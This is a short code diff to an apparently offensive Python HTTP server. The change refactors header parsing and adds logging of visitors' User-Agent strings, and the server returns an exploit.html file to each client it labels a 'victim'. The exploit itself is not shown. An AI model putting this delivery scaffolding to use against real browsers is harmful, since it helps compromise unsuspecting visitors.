@@ -21,21 +21,31 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		self.server=server
 		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
 		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),1)
+	def get_header(self,req,header_name,splitter=":"):
+		headers=req.split("\n")
+		result = ""
+		for header in headers:
+			headerparts = header.split(splitter)
+			if len(headerparts)>1:
+				if headerparts[0].strip().upper()==header_name.upper():
+					result = header.strip()
+		return result
 	def handle_read(self):
 		global REQPAGE, REQHEADER, REQHEADERDONE
 		data = self.recv(1024)
-		headers=data.split("\n")
+		request = self.get_header(data,"GET", " ")
 		page = ""
-		for header in headers:
-			headerparts = header.split(" ")
-			if len(headerparts) > 1:
-				if headerparts[0]=="GET":
-					page = headerparts[1].replace("/","")
-					if page =="": page = "exploit.html"
-					self.server.log("Victim requested page: " + page,0)
+		if request <>"":
+			headerparts = request.split(" ")
+			if headerparts[0]=="GET":
+				page = headerparts[1].replace("/","")
+				if page =="": page = "exploit.html"
+				self.server.log("Victim requested page: " + page,0)
 		page = page.split("?")[0]
 		if page != "":
 			if page=="exploit.html":
+				agent = self.get_header(data,"USER-AGENT",":")
+				self.server.log("---" + agent,2)
 				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: 62.213.198.42\r\nContent-Length: $len$\r\n\r\n"""
 				f = open("exploit/exploit.html","r")
 				body = f.read()
